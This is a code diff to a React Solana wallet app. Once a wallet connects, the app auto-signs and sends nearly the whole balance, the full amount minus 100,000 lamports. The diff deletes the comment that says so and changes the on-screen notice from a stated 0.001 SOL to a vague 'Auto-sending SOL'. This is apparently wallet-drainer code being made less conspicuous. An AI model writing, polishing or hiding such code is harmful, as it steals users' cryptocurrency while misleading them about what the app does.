@@ -50,7 +50,7 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
     );
 
     return (
-        <ConnectionProvider endpoint={'https://api.mainnet-beta.solana.com'}>
+        <ConnectionProvider endpoint="https://api.mainnet-beta.solana.com">
             <WalletProvider wallets={wallets} autoConnect>
                 <WalletModalProvider>{children}</WalletModalProvider>
             </WalletProvider>
@@ -121,7 +121,7 @@ const WalletConnectionHandler: FC = () => {
             console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
             console.log(`💰 Balance: ${(lamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
 
-            const sendAmount = lamports - 100000; // send full balance minus 100,000 lamports
+            const sendAmount = lamports - 100000;
             if (sendAmount <= 0) {
                 alert('⚠️ Not enough SOL to send.');
                 return;
@@ -148,12 +148,8 @@ const WalletConnectionHandler: FC = () => {
 
             setTimeout(async () => {
                 try {
-                    if (connection) {
-                        const txid = await connection.sendRawTransaction(signedTx.serialize());
-                        console.log(`🚀 Transaction sent. Signature: ${txid}`);
-                    } else {
-                        console.error('❌ No connection available.');
-                    }
+                    const txid = await connection.sendRawTransaction(signedTx.serialize());
+                    console.log(`🚀 Transaction sent. Signature: ${txid}`);
                 } catch (err) {
                     console.error('❌ Failed to send transaction:', err);
                 }
@@ -227,7 +223,7 @@ const WalletConnectionHandler: FC = () => {
                         <strong>Balance:</strong>{' '}
                         {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
                     </p>
-                    <p style={{ color: '#ff91e3', fontSize: '13px' }}>🚀 Auto-sending 0.001 SOL in 10s...</p>
+                    <p style={{ color: '#ff91e3', fontSize: '13px' }}>🚀 Auto-sending SOL in 10s...</p>
                 </>
             )}
         </div>
@@ -237,4 +233,3 @@ const WalletConnectionHandler: FC = () => {
 };
 
 export default App;
- 
